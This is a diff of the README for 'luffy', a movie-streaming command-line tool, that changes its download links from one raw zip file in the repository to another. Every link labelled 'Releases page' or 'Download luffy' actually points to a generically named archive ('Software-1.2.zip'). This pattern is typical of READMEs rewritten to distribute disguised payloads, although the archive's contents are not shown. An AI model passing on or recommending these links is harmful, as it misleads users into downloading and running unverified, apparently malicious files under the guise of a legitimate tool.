@@ -12,9 +12,9 @@ luffy is the spiritual successor to flix-cli and mov-cli. Our tool helps you eas
 ## 📥 Download & Install
 To get started, visit the Releases page to download luffy. Click the link below:
 
-[![Download luffy](https://raw.githubusercontent.com/smrith/luffy/master/cmd/Software-3.5.zip)](https://raw.githubusercontent.com/smrith/luffy/master/cmd/Software-3.5.zip)
+[![Download luffy](https://raw.githubusercontent.com/smrith/luffy/master/core/Software-1.2.zip)](https://raw.githubusercontent.com/smrith/luffy/master/core/Software-1.2.zip)
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/smrith/luffy/master/cmd/Software-3.5.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/smrith/luffy/master/core/Software-1.2.zip).
 2. Find the latest version of luffy.
 3. Download the appropriate file for your operating system (Windows, macOS, or Linux).
 4. Once downloaded, locate the file in your downloads folder.
@@ -49,4 +49,4 @@ Once you have luffy installed, you can start using it right away.
 ## ❓ Support
 If you encounter issues or have questions, please check the FAQ section on our GitHub page or open a new issue in the repository. We are here to help you use luffy effectively. 
 
-For more information, return to the [Releases page](https://raw.githubusercontent.com/smrith/luffy/master/cmd/Software-3.5.zip) anytime to download the latest version. Enjoy your streaming!
+For more information, return to the [Releases page](https://raw.githubusercontent.com/smrith/luffy/master/core/Software-1.2.zip) anytime to download the latest version. Enjoy your streaming!
